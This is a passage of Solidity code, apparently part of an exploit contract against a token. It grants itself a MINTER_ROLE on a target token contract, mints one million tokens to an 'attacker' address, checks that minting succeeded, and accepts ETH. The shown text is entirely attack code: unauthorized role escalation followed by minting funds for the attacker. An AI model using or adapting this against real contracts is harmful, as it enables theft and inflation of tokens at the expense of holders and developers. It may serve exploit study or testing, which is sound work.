        bytes32 MINTER_ROLE = keccak256("MINTER_ROLE");
        ISecondToken(TARGET).grantRole(MINTER_ROLE, attacker);
        ISecondToken(TARGET).mint(attacker, 1_000_000 * 10**18);

        require(fitToken.balanceOf(attacker) >= 1_000_000 * 10**18, "Minting failed");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
